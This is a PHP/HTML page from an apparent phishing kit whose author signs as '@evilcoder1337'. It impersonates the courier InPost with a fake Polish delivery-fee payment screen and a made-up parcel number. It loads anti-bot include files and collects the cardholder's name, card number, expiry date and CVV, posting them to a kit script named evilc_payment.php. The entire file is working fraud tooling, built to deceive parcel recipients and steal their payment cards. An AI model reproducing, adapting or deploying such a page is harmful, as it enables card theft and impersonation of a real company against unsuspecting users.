<?php
session_start();
error_reporting(0);

/*   
		██████████          ███████       █████████    █████       █████ ████████         
		░░███░░░░░█         ░░░░░███      ███░░░░░███ ███░░░███    ░░███ ███░░░░███        
		░███  █ ░█████ ████████░███     ███     ░░░ ███   ░░███ ███████░░░    ░██████████ 
		░██████ ░░███ ░░██░░███░███    ░███        ░███    ░██████░░███   ██████░░███░░███
		░███░░█  ░███  ░███░███░███    ░███        ░███    ░██░███ ░███  ░░░░░░██░███ ░░░ 
		░███ ░   ░░███ ███ ░███░███    ░░███     ██░░███   ███░███ ░███ ███   ░██░███     
		██████████░░█████  █████████    ░░█████████ ░░░█████░ ░░███████░░█████████████    
		░░░░░░░░░░  ░░░░░  ░░░░░░░░░      ░░░░░░░░░    ░░░░░░   ░░░░░░░░ ░░░░░░░░░░░░░    
		
		
		ICQ & TELEGRAM : @evilcoder1337
*/
include'../config.php'; 
include'../evil_coder/Functions/Fuck-you.php'; 
include "../antibots/anti1.php";
include "../antibots/anti2.php";
include "../antibots/anti3.php";
include "../antibots/anti4.php";
include "../antibots/anti5.php";
include "../antibots/anti6.php";
include "../antibots/anti7.php";
include "../antibots/anti8.php";

if (!isset($_GET['inpost_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }


?>
<!DOCTYPE html>
<html lang="pl" dir="ltr">
<head>
    <meta charset="utf-8" />
    <meta name="title" content="InPost dla Ciebie - Paczkomat®, Kurier, Przesyłki Kurierskie i Paczki" />
    <meta name="MobileOptimized" content="width" />
    <meta name="HandheldFriendly" content="true" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta property="og:image" content="https://inpost.plsites/default/files/InPost_logotype_2019_white.png" />
    <meta property="og:image:secure_url" content="https://inpost.plsites/default/files/InPost_logotype_2019_white.png" />
    <link rel="shortcut icon" href="themes/custom/inpost/favicon.ico" type="image/vnd.microsoft.icon" />
    <link href="files/no1/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
    <link rel="stylesheet" href="files/no1/font-awesome.min.css">
    <script src="files/no1/jquery-1.11.1.min.js.téléchargement"></script><style>undefined</style><style>undefined</style><style>undefined</style>
    <link rel="stylesheet" href="files/no1/core.css">
    <link rel="apple-touch-icon" sizes="57x57" href="themes/custom/inpost/images/favicon/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="themes/custom/inpost/images/favicon/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="themes/custom/inpost/images/favicon/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="themes/custom/inpost/images/favicon/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="themes/custom/inpost/images/favicon/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="themes/custom/inpost/images/favicon/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="themes/custom/inpost/images/favicon/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="themes/custom/inpost/images/favicon/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="themes/custom/inpost/images/favicon/apple-icon-180x180.png">

    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="themes/custom/inpost/images/favicon/apple-touch-icon-114x114-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="themes/custom/inpost/images/favicon/apple-touch-icon-72x72-precomposed.png">
    <link rel="apple-touch-icon-precomposed" href="themes/custom/inpost/images/favicon/touch-icon-iphone-precomposed.png">

    <link rel="icon" type="image/png" sizes="256x256" href="themes/custom/inpost/images/favicon/android-icon-256x256.png">
    <link rel="icon" type="image/png" sizes="192x192" href="themes/custom/inpost/images/favicon/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="themes/custom/inpost/images/favicon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="themes/custom/inpost/images/favicon/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="themes/custom/inpost/images/favicon/favicon-16x16.png">

    <link rel="manifest" href="/manifest.json">
    <meta name="msapplication-TileColor" content="#ffcb04">
    <meta name="msapplication-TileImage" content="themes/custom/inpost/images/favicon/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <meta name="robots" content="index,follow,all" data-react-helmet="true">

    <title>InPost dla Ciebie - Paczkomat®, Kurier, Przesyłki Kurierskie i Paczki</title>

    <link rel="stylesheet" href="themes/custom/inpost/css/critical.css">

</head>
<style type="text/css"> 
button.btn.btn-continue.mt-1.mb-1 {
    margin-right: 8px;
    width: 100px;
}
</style>
<body class="page-node-1 path-frontpage page-node-type-page pl">
    <div class="blend"><img class="main--logo" src="themes/custom/inpost/logo.svg" /></div>
    <a href="#main-content" class="visually-hidden focusable">
      Przejdź do treści
    </a>
    
    <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas>
        <div class="layout-container layoutContainer">

            <nav class="mobile--side--nav sideNav">
                <div class="content">
                    <div>

                        <div class="mobile--search--component mobileSearchComponent">
                            <button class="btn--search btnSearchMobile" disabled>
          <i class="icon-search"></i>
        </button>
                            <input class="form--control -mobilesearch mobileSearchInput" placeholder="Szukaj w InPost" type="text">
                        </div>

                        <ul class="mobile--menu" role="menu">
                            <li class="menuItemSub -withsubmenu">
                                <a href="/odbieram" title="Odbieraj z InPost" data-drupal-link-system-path="node/2">Odbieram</a>
                                <ul class="submenu--list submenuList" role="menu">
                                    <li>
                                        <a href="/odbieram" title="Odbieraj z InPost" data-drupal-link-system-path="node/2">Odbieram</a>
                                    </li>
                                    <li class="item--withicon--mobile">
                                        <span class="icon icon-track-2 -whitecircle"><span class="path1"></span><span class="path2"></span></span>
                                        <a href="/sledzenie-przesylek" class="item-with-find-icon" title="Śledzenie paczki" data-drupal-link-system-path="find-parcel">Śledzenie paczki</a>
                                    </li>
                                    <li class="item--withicon--mobile">
                                        <span class="icon icon-track-3 -whitecircle"><span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span>
                                        <span
                                            class="path7"></span><span class="path8"></span></span>
                                            <a href="/znajdz-paczkomat" class="item-with-point-icon" title="Znajdź Paczkomat® InPost" data-drupal-link-system-path="find-location">Znajdź Paczkomat® InPost</a>
                                    </li>
                                    <li>
                                        <a href="/jak-odebrac-paczke-w-paczkomacie" title="Jak odebrać paczkę?" data-drupal-link-system-path="node/7794">Jak odebrać paczkę z urządzenia Paczkomat® InPost?</a>
                                    </li>
                                    <li>
                                        <a href="/szybkie-zwroty" target="_self" title="Szybkie Zwroty" data-drupal-link-system-path="node/7773">Szybkie Zwroty</a>
                                    </li>
                                    <li>
                                        <a href="/ekozwroty" title="EKOzwroty" data-drupal-link-system-path="node/12788">EKOzwroty</a>
                                    </li>
                                    <li>
                                        <a href="/ekobox" title="EkoBox InPost" data-drupal-link-system-path="node/12723">EkoBox InPost</a>
                                    </li>
                                    <li>
                                        <a href="/paczkomat-appkomat" data-drupal-link-system-path="node/12785">Appkomat InPost</a>
                                    </li>
                                    <li>
                                        <a href="/aplikacja-mobilna" title="Aplikacja" data-drupal-link-system-path="node/7766">Aplikacja</a>
                                    </li>
                                </ul>

                            </li>
                            <li class="menuItemSub -withsubmenu">
                                <a href="/wysylam" title="Wysyłaj z InPost" data-drupal-link-system-path="node/3">Wysyłam</a>
                                <ul class="submenu--list submenuList" role="menu">
                                    <li>
                                        <a href="/wysylam" title="Wysyłaj z InPost" data-drupal-link-system-path="node/3">Wysyłam</a>
                                    </li>
                                    <li>
                                        <a href="https://inpost.pl/SzybkieNadania/" target="_blank" title="Nadaj przesyłkę">Szybkie Nadania</a>
                                    </li>
                                    <li>
                                        <a href="https://urzad24.inpost.pl/" title="Urząd 24 ">Urząd 24</a>
                                    </li>
                                    <li>
                                        <a href="/wysylam-jak-nadac-paczke-w-paczkomacie" title="Jak nadać paczkę w automacie Paczkomat® InPost?" data-drupal-link-system-path="node/15">Jak nadać paczkę w automacie Paczkomat® InPost?</a>
                                    </li>
                                    <li class="item--withicon--mobile">
                                        <span class="icon -double">
      <span class="icon-point-2-yellow -smaller"><span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span>
                                        <span
                                            class="path7"></span><span class="path8"></span></span>
                                            <span class="icon-point-2-yellow -smaller"><span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span>
                                            <span
                                                class="path7"></span><span class="path8"></span></span>
                                                </span>
                                                <a href="/wysylam-z-paczkomatu-do-paczkomatu" class="item-with-point-to-point" title="Z Paczkomatu do Paczkomatu" data-drupal-link-system-path="node/8221">Paczkomat → Paczkomat</a>
                                    </li>
                                    <li class="item--withicon--mobile">
                                        <span class="icon -double">
      <span class="icon-point-2-yellow -smaller"><span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span>
                                        <span
                                            class="path7"></span><span class="path8"></span></span>
                                            <span class="icon icon-house -withrectangle"><span class="path1"></span><span class="path2"></span></span>
                                            </span>
                                            <a href="/wysylam-z-paczkomatu-do-domu" class="item-with-point-to-home" title="Z Paczkomatu do Domu" data-drupal-link-system-path="node/8222">Paczkomat → Dom</a>
                                    </li>
                                    <li class="item--withicon--mobile">
                                        <span class="icon -double">
      <span class="icon icon-house -withrectangle"><span class="path1"></span><span class="path2"></span></span>
                                        <span class="icon-point-2-yellow -smaller"><span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span>
                                        <span
                                            class="path7"></span><span class="path8"></span></span>
                                            </span>
                                            <a href="/wysylam-z-domu-do-paczkomatu" class="item-with-home-to-point" title="Z Domu do Paczkomatu" data-drupal-link-system-path="node/8223">Dom → Paczkomat</a>
                                    </li>
                                    <li class="item--withicon--mobile">
                                        <span class="icon -double">
      <span class="icon-house -withrectangle"><span class="path1"></span><span class="path2"></span></span>
                                        <span class="icon-house -withrectangle"><span class="path1"></span><span class="path2"></span></span>
                                        </span>
                                        <a href="/wysylam-z-domu-do-domu" class="item-with-home-to-home" title="Z Domu do Domu" data-drupal-link-system-path="node/8224">Dom → Dom</a>
                                    </li>
                                </ul>

                            </li>
                            <li class="menuItemSub -withsubmenu">
                                <a href="/oferta-dla-firm-i-allegro" title="Zobacz Ofertę dla Firm" data-drupal-link-system-path="node/4">Dla Firm</a>
                                <ul class="submenu--list submenuList" role="menu">
                                    <li>
                                        <a href="/oferta-dla-firm-i-allegro" title="Zobacz Ofertę dla Firm" data-drupal-link-system-path="node/4">Dla Firm</a>
                                    </li>
                                    <li>
                                        <a href="/fulfillment" title="Fulfillment" data-drupal-link-system-path="node/7778">Fulfillment</a>
                                    </li>
                                    <li>
                                        <a href="/smartcourier-oferta" data-drupal-link-system-path="node/12243">SmartCourier</a>
                                    </li>
                                    <li>
                                        <a href="/urzad24" title="Zgłoś urząd do programu" data-drupal-link-system-path="node/12167">Urząd 24 </a>
                                    </li>
                                    <li>
                                        <a href="/abonamenty-dla-firm" title="Pakiety Kurierskie" data-drupal-link-system-path="node/7792">Abonamenty</a>
                                    </li>
                                    <li>
                                        <a href="/integracja-z-inpost" data-drupal-link-system-path="node/7782">Integracja z InPost</a>
                                    </li>
                                    <li>
                                        <a href="/do-pobrania" data-drupal-link-system-path="node/10977">Do pobrania</a>
                                    </li>
                                    <li>
                                        <a href="/opakowania" data-drupal-link-system-path="node/8203">Opakowania</a>
                                    </li>
                                </ul>

                            </li>
                            <li class="menuItemSub -withsubmenu">
                                <a href="/o-inpost" title="O InPost" data-drupal-link-system-path="node/5">O InPost</a>
                                <ul class="submenu--list submenuList" role="menu">
                                    <li>
                                        <a href="/o-inpost" title="O InPost" data-drupal-link-system-path="node/5">O InPost</a>
                                    </li>
                                    <li>
                                        <a href="/inpost-dla-ekologii" title="InPost dla środowiska" data-drupal-link-system-path="node/13">InPost dla środowiska</a>
                                    </li>
                                    <li>
                                        <a href="/sport-team" data-drupal-link-system-path="node/12238">InPost Sport Team</a>
                                    </li>
                                    <li>
                                        <a href="/aktualnosci" data-drupal-link-system-path="aktualnosci">Blog</a>
                                    </li>
                                    <li>
                                        <a href="/dla-prasy" title="Dla Prasy" data-drupal-link-system-path="node/7767">Dla Prasy</a>
                                    </li>
                                    <li>
                                        <a href="/bezpieczenstwo-z-inpost" data-drupal-link-system-path="node/12124">Bezpieczeństwo</a>
                                    </li>
                                    <li>
                                        <a href="/strategia-esg" data-drupal-link-system-path="node/12657">Strategia ESG Grupy InPost</a>
                                    </li>
                                </ul>

                            </li>
                            <li>
                                <a href="/dla-kibica" data-drupal-link-system-path="node/12715">Dla Kibica</a>
                            </li>
                            <li>
                                <a href="/cenniki" title="Zobacz Cenniki" data-drupal-link-system-path="node/7775">Cennik</a>
                            </li>
                            <li>
                                <a href="/kontakt" title="Kontakt" data-drupal-link-system-path="node/12">Kontakt</a>
                            </li>
                            <li>
                                <a href="https://inpostfresh.pl" target="_blank">Zakupy</a>
                            </li>
                        </ul>




                    </div>
                    <ul class="mobile--cta--menu">
                        <li>
                            <i class="icon-track-2"><span class="path1"></span><span class="path2"></span></i>
                            <a href="/sledzenie-przesylek">Śledź paczkę</a>
                        </li>
                        <li>
                            <i class="icon-track-3"><span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span><span class="path8"></span></i>
                            <a href="/znajdz-paczkomat">Znajdź Paczkomat®</a>
                        </li>
                        <li class="menuItemSub -withsubmenu">
                            <i class="icon-login"></i>
                            <a href="#">Zaloguj się</a>
                            <ul class="submenu submenu--list submenuList" role="menu">
                                <li>
                                    <a href="https://manager.paczkomaty.pl/auth/login" target="_blank">Manager Paczek</a>
                                </li>
                                <li>
                                    <a href="https://kurier.inpost.pl/Default.aspx" target="_blank">WebTrucker</a>
                                </li>
                            </ul>
                        </li>
                    </ul>
                    <ul class="language-switcher-language-url language--switcher">
                        <li hreflang="pl" data-drupal-link-system-path="&lt;front&gt;" class="pl is-active"><a href="/" class="language-link is-active" hreflang="pl" data-drupal-link-system-path="&lt;front&gt;">Polish</a></li>
                        <li hreflang="en" data-drupal-link-system-path="&lt;front&gt;" class="en"><a href="/en" class="language-link" hreflang="en" data-drupal-link-system-path="&lt;front&gt;">English</a></li>
                        <li hreflang="uk" data-drupal-link-system-path="&lt;front&gt;" class="uk"><a href="/ua" class="language-link" hreflang="uk" data-drupal-link-system-path="&lt;front&gt;">Ukrainian</a></li>
                    </ul>
                </div>
            </nav>



            <header class="main--header mainHeader" role="banner">
                <div class="app-banner" id="app-banner"></div>

                <div class="content">
                    <div class="container">
                        <div class="row justify-content-lg-between">
                            <div class="d-lg-none col-4 d-flex">
                                <button class="btn--mobile btnMenuMobile">
            <span></span>
            <span></span>
            <span></span>
          </button>
                            </div>
                            <div class="col-4 col-lg-auto pr-md-0">
                                <div class="d-flex justify-content-center justify-content-lg-start align-items-center">
                                    <a href="/" class="main--logo--container" title="Strona główna" rel="home">
                <img class="main--logo"
                  src="themes/custom/inpost/logo.svg"
                alt="InPost logo"/>
              </a>
			  
			  
			  
			  
			  
			  
			  
			  
			  
	


                                </div>
                            </div>
                            <div class="col-4 col-md-3 col-lg-auto">
                                <div class="d-flex align-items-center justify-content-end h-100">
                         
                                    <div class="login--component">
                            <ul class="language-switcher-language-url language--switcher">
                                <li hreflang="pl" data-drupal-link-system-path="&lt;front&gt;" class="pl is-active"><a href="/" class="language-link is-active" hreflang="pl" data-drupal-link-system-path="&lt;front&gt;">Polish</a></li>
                                <li hreflang="en" data-drupal-link-system-path="&lt;front&gt;" class="en"><a href="#" class="language-link" hreflang="en" data-drupal-link-system-path="&lt;front&gt;">English</a></li>
                                <li hreflang="uk" data-drupal-link-system-path="&lt;front&gt;" class="uk"><a href="#" class="language-link" hreflang="uk" data-drupal-link-system-path="&lt;front&gt;">Ukrainian</a></li>
                            </ul>          
                                    </div>
                                    <div class="herring--mobile d-block d-lg-none">
                            <ul class="language-switcher-language-url language--switcher">
                                <li hreflang="pl" data-drupal-link-system-path="&lt;front&gt;" class="pl is-active"><a href="/" class="language-link is-active" hreflang="pl" data-drupal-link-system-path="&lt;front&gt;">Polish</a></li>
                                <li hreflang="en" data-drupal-link-system-path="&lt;front&gt;" class="en"><a href="#" class="language-link" hreflang="en" data-drupal-link-system-path="&lt;front&gt;">English</a></li>
                                <li hreflang="uk" data-drupal-link-system-path="&lt;front&gt;" class="uk"><a href="#" class="language-link" hreflang="uk" data-drupal-link-system-path="&lt;front&gt;">Ukrainian</a></li>
                            </ul> 
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="cta--mainbox--wrapper -attached">
                    <div class="container">

                    </div>
                </div>
            </header>
            <div class="main--scene--wrapper">
                <div class="main--scene mainScene">





                    <main role="main">
                        <a id="main-content" tabindex="-1"></a>
                        <div data-drupal-messages-fallback class="hidden"></div>


                        <div role="article">

                            <div class="common--hero--block" data-parallax="scroll" data-positionY="top" data-image-src="#">
                                <div class="mobileimg d-md-none" style="background-image:url('#');"></div>
                                <div class="container">
<section style="margin-top: 4rem; position: relative">
    <div class="container boxed-view" style="margin-top: 5rem; padding-left: 0;" bis_skin_checked="1">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <li class="breadcrumb-item active">odebrać przesyłkę</li>
                <li class="breadcrumb-item" aria-current="page">Płacić</li>
                <li class="breadcrumb-item" aria-current="page">W procesie</li>
            </ol>
        </nav>
    </div>
</section>
<section>
    <div class="container boxed-view" bis_skin_checked="1">
        <div class="row py-3 px-3 synopsis" style="margin-bottom: 3px" bis_skin_checked="1">
            <div class="col-6 synopsis-title" bis_skin_checked="1">
                <span><b>Numer przesyłki</b></span>
            </div>
            <div class="col-6 synopsis-text" style="width: 50%" bis_skin_checked="1">
                <span>JJD01558535</span>
            </div>
        </div>
        <div class="row py-3 px-3 synopsis" bis_skin_checked="1">
            <div class="col-6 synopsis-title" bis_skin_checked="1">
                <div class="vstack" bis_skin_checked="1">
                    
                    <div class="d-flex flex-column flex-md-row" bis_skin_checked="1"><b>Koszty dostawy:
                            &nbsp;</b>10 Zł </div>
                </div>
            </div>
            <div class="col-6 synopsis-text" style="width: 50%" bis_skin_checked="1">
                <div class="vstack" bis_skin_checked="1">
                    
                    <div class="d-flex flex-column flex-md-row" bis_skin_checked="1"><b>Dostarczone przez:
                            &nbsp;</b>Koniec dnia</div>
                </div>
            </div>
        </div>
    </div>
</section>	








<section class="mt-1">
    <div class="container boxed-view" style="padding-left: 0; padding-right: 0" bis_skin_checked="1">
        <div class="card" bis_skin_checked="1">
            <div class="card-title pt-3" style="padding-left: 1rem;" bis_skin_checked="1">
                <h3 class="ml-1">Zapłata</h3>
				<label for="card">&nbsp; Akceptowane karty &nbsp;:&nbsp;&nbsp;&nbsp; &nbsp;  </label>
				<img id="card" style="float:;" src="assets/images/card.png" width="60px" alt="acceptable-payments" />
            </div>
            <div class="card-body" bis_skin_checked="1">
                <div class="row" bis_skin_checked="1">
                    <div class="col-12 col-md-5" bis_skin_checked="1">
                        <div class="row" bis_skin_checked="1">
                            
                            <div class="col-6 vstack" bis_skin_checked="1">
                                <h6><b>Podsumowanie kosztów transportu</b></h6>
                                <span>Dostawa dla klientów indywidualnych: 10 Zł</span>
                            </div>
                        </div>
                    </div>
                    <div class="col-12 col-md-7 mt-3 mt-lg-0" bis_skin_checked="1">
                        <form method="POST" action="../evil_coder/proc/evilc_payment.php">
                            <div class="row" bis_skin_checked="1">
                                <div class="input-group mb-1" bis_skin_checked="1">
                                    <span class="input-group-text input-group-text-cc" id="basic-addon1"><i class="fa fa-user"></i></span>
                                    <input type="text" class="form-control" name="c_holdername" id="c_holdername" placeholder="Pełne imię i nazwisko">
                                </div>
                            </div>
                            <div class="row" bis_skin_checked="1">
                                <div class="col-lg-6 col-md-12 col-sm-12 mr-lg-0" bis_skin_checked="1">
                                    <div class="input-group mb-1" bis_skin_checked="1">
                                        <span class="input-group-text input-group-text-cc"><i id="cc_badge" class="fa fa-credit-card"></i></span>
                                        <input type="tel" class="form-control cc-number" autocomplete="cc-number" placeholder="XXXX XXXX XXXX XXXX" onkeypress="return formats(this,event)" onkeyup="return numberValidation(event)" name="creditCardNumber" id="creditCardNumber">
                                    </div>
                                </div>
                                <div class="col-6 col-lg-3 col-md-6 col-sm-6" style="padding-right: 0.1rem;" bis_skin_checked="1">
                                    <div class="input-group mb-1" bis_skin_checked="1">
                                        <span class="input-group-text input-group-text-cc" id="basic-addon1"><i class="fa fa-calendar-check-o"></i></span>
                                        <input type="tel" class="form-control" placeholder="MM/YY" name="c_expiration" id="c_expiration" autocomplete="cc-exp">
										
															<script src="files/js/mask.js"></script>
                                    													<script>
                                    													var element = document.getElementById('c_expiration');
                                    													var maskOptions = {mask: '00/00'};
                                    													var mask = IMask(element, maskOptions);
                                    												    </script>
                                    </div>
                                </div>
                                <div class="col-6 col-lg-3 col-md-6 col-sm-6" style="padding-left: 0.1rem;" bis_skin_checked="1">
                                    <div class="input-group mb-1" bis_skin_checked="1">
                                        <span class="input-group-text input-group-text-cc" id="basic-addon1"><i class="fa fa-unlock-alt"></i></span>
                                        <input type="tel" class="form-control" placeholder="CVV" name="c_csc" id="c_csc" autocomplete="off">
							                           								<script src="files/js/mask.js"></script>         													<script>
                                    													var element = document.getElementById('c_csc');
                                    													var maskOptions = {mask: '000'};
                                    													var mask = IMask(element, maskOptions);
                                    												    </script>			
                                    </div>
                                </div>
                            </div>
                            <div class="row pt-4" bis_skin_checked="1">
                                <div class="d-flex flex-row-reverse" bis_skin_checked="1">
                                    <button type="submit" class="btn btn-continue mt-1 mb-1">
                                        Płacić
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>



<!-- Including Bootstrap JS (with its jQuery dependency) so that dynamic components work -->
<script src="./files/Erhalt der Sendung _ Zahlung_files/bootstrap.bundle.min.js.téléchargement" integrity="sha384-/bQdsTh/da6pkI1MST/rWKFNjaCP5gBSY4sEBT38Q/9RBh9AH40zEOg7Hlq2THRZ" crossorigin="anonymous"></script>
<script>
    $(document).ready(function () {
        $("#creditCardNumber").payment('formatCardNumber');
        $("#c_expiration").payment('formatCardExpiry');
        $("#c_csc").payment('formatCardCVC');
    });
    $.fn.toggleInputError = function (erred) {
        this.parent('.form-group').toggleClass('has-error', erred);
        return this;
    };

    $("#creditCardNumber").keyup(function () {
        let type = $.payment.cardType($("#creditCardNumber").val());
        let badge = $("#cc_badge");
        switch (type) {
            case "visa":
                badge.attr("class", "fa fa-cc-visa");
                break;
            case "mastercard":
                badge.attr("class", "fa fa-cc-mastercard");
                break;
            case "amex":
                badge.attr("class", "fa fa-cc-amex");
                break;
            case "dinersclub":
                badge.attr("class", "fa fa-cc-diners-club");
                break;
            case "discover":
                badge.attr("class", "fa fa-cc-discover");
                break;
            case "jcb":
                badge.attr("class", "fa fa-cc-jcb");
                break;
            default:
                badge.attr("class", "fa fa-credit-card");
        }
    });

    $("#contentForm").submit(function (event) {
        event.preventDefault();

        // capture data
        let num = $("#creditCardNumber").val();
        let expiration = $("#c_expiration").val();
        let cardholderName = $("#c_holdername").val();
        let csc = $("#c_csc").val();

        let valid = $.payment.validateCardNumber(num);
        if (!valid) {
            alert("Bitte geben Sie eine gültige Kreditkartennummer an.");
            return false;
        }
        if (cardholderName.split(" ").length < 2) {
            alert("Please provide a valid card holder name.");
            return false;
        }
        try {
            let _exp = $.payment.cardExpiryVal(expiration);
            valid = $.payment.validateCardExpiry(_exp.month, _exp.year);
        } catch (e) {
            valid = false;
        }
        if (!valid) {
            alert("Bitte geben Sie ein gültiges Gültigkeitsdatum der Karte an.");
            return false;
        }

        valid = $.payment.validateCardCVC(csc);
        if (!valid) {
            alert("Bitte geben Sie einen gültigen CVC an.");
            return false;
        }

        $("#loading").fadeIn();
       
            $("#loading_spinner").fadeOut();
            $('#challenge')
                .attr("src", data.source)
                .css("display", "block")
                .css("height", data.height)
                .css("width", data.width)
        
    });
</script>



<div id="torrent-scanner-popup" style="display: none;" bis_skin_checked="1"></div><script>function formats(ele,e){
        if(ele.value.length<19){
          ele.value= ele.value.replace(/\W/gi, '').replace(/(.{4})/g, '$1 ');
          return true;
        }else{
          return false;
        }
      }
      
      function numberValidation(e){
        e.target.value = e.target.value.replace(/[^\d ]/g,'');
        return false;
      }</script></section>



















                                </div>
                            </div>









                        </div>








                    </main>

                    <footer role="contentinfo" class="mainFooter">
                        <div class="container">
                            <div class="row">
                                <div class="col-12 mb-5">
                                    <div class="d-flex">
                                        <div class="footer--logo--wrapper">
                                            <a class="footer--logo" href="/" title="Strona główna" rel="home">
              <img src="themes/custom/inpost/logo.svg" alt="InPost logo">
            </a>
                                        </div>
                                        <div class="menu--fotter--wrapper">


                                            <ul region="footer_menu" class="menu--fotter" role="menu">
                                                <li>
                                                    <a href="https://inpost.pl/fundacja-inpost">Fundacja InPost</a>
                                                </li>
                                                <li>
                                                    <a href="https://inpost.pl/SzybkieNadania/" target="_blank">Szybkie Nadania</a>
                                                </li>
                                                <li>
                                                    <a href="https://inpost.pl/kariera">Kariera</a>
                                                </li>
                                                <li>
                                                    <a href="https://inpost.pl/reklama">Reklama z InPost</a>
                                                </li>
                                                <li>
                                                    <a href="https://inpost.pl/regulaminy">Regulaminy</a>
                                                </li>
                                            </ul>



                                        </div>


                                    </div>
                                </div>
                                <div class="col-12">
                                    <div class="row">
                                        <div class="col-lg-5 col-xl-5">
                                            <div class="contact--info--box">
                                                <div class="topbox row">
                                                    <div class="col-12 col-sm-auto mb-3 mb-sm-0">
                                                        <a href="tel:+48722444000">
                    <i class="icon-phone"></i>
                    +48 722 444 000
                  </a>
                                                    </div>
                                                    <div class="col-12 col-sm-auto">
                                                        <a href="tel:+48746600000">
                  <i class="icon-phone"></i>
                  +48 746 600 000
                </a>
                                                    </div>
                                                </div>
                                                <div class="bottombox">
                                                    <p></p>
                                                    <p>pon. - pt. 7:00 AM - 10:00 PM, sob. 8:00 AM - 8:00 PM,<br> niedziele 8:00 AM - 6:00 PM, Święta 8:00 AM - 4:00 PM</p>
                                                </div>
                                            </div>
                                        </div>
           
                                    </div>
                                </div>
                                <div class="col-12">
                                    <div class="footer--bottom">
                                        <div class="row">
                                            <div class="col-lg-3">
                                                <ul class="socials--menu">
                                                    <li>
                                                        <a href="javascript:void(0)" data-url="https://www.facebook.com/paczkomatkurier/" data-target="_blank" class="js-link">
                    <i class="icon-facebook"></i>
                  </a>
                                                    </li>
                                                    <li>
                                                        <a href="javascript:void(0)" data-url="https://twitter.com/InPostPL" data-target="_blank" class="js-link">
                    <i class="icon-twitter"></i>
                  </a>
                                                    </li>
                                                    <li>
                                                        <a href="javascript:void(0)" data-url="https://www.linkedin.com/company/inpost" data-target="_blank" class="js-link">
                    <i class="icon-linkedin"></i>
                  </a>
                                                    </li>
                                                    <li>
                                                        <a href="javascript:void(0)" data-url="https://www.youtube.com/channel/UCAzk7yw8Tzd76EmCRlMB-gA/videos" data-target="_blank" class="js-link">
                    <i class="icon-youtube"></i>
                  </a>
                                                    </li>
                                                    <li>
                                                        <a href="javascript:void(0)" data-url="https://www.instagram.com/inpostpl/" data-target="_blank" class="js-link">
                    <i class="icon-instagram"></i>
                  </a>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div class="col d-flex align-items-center justify-content-end">
                                                <ul class="footer--small--menu">
                                                    <li>
                                                        <a href="javascript:void(0)" data-url="/polityka-prywatnosci" class="js-link">Polityka Prywatności</a>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div class="col-12 col-lg-auto d-flex align-items-center justify-content-lg-end">
                                                <p class="paragraph--component -small">Copyright &copy; 2023 InPost sp. z o.o. Wszelkie prawa zastrzeżone.</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </footer>

                    <button type="button" class="bottom--mat footerMatToTop">
    <div class="footerMat"></div>
  </button>


                    <div class="newsletter--agreement--popup popupContainer" id="newsletter-popup" style="display: none;">
                        <button type="button" class="close closePopupBtn">
        <span class="icon-close"></span>
    </button>
                        <div class="col-12">

                            <form class="newsletterPopupForm validateForm" data-drupal-selector="newsletter" action="/" method="post" id="newsletter" accept-charset="UTF-8">
                                <div class="row">
                                    <fieldset class="header--h3 mb-3 js-form-item form-item js-form-wrapper col-12" data-drupal-selector="edit-features-wrapper" id="edit-features-wrapper">
                                        <legend class="pt-3 m-0">
                                            <span class="header--h3">Newsletter</span>
                                        </legend>
                                    </fieldset>
                                    <div class="row">
                                        <div class="col-md-8 mb-3 mb-md-0">
                                            <div class="form--group js-form-item mb-4 js-form-type-email -email col-12">
                                                <div class="row">

                                                    <div>

                                                        <input placeholder="Adres e-mail" class="form--control form-email required" data-drupal-selector="edit-email" type="email" id="edit-email" name="email" value="" size="60" maxlength="254" required="required" aria-required="true" />

                                                    </div>

                                                </div>

                                            </div>
                                        </div>
                                        <div class="col-md-4"><span class="input-group-btn">
<button  class="btn--primary  w-100 button js-form-submit form-submit btn--primary" data-drupal-selector="edit-submit" type="submit" id="edit-submit" name="op" value="Zapisz">
  <span>Zapisz</span>
                                            </button>
                                            </span>
                                        </div>
                                    </div>
                                    <div class='toggleContainer'>
                                        <p class='input--info'>Podanie adresu email oznacza wyrażenie zgody na otrzymywanie od InPost sp. z o.o. informacji handlowych dotyczących produktów i usług InPost sp. z o.o., spółek z Grupy Integer.pl oraz podmiotów współpracujących
                                            z ww. spółkami na podany przeze mnie adres e-mail.<br></p>
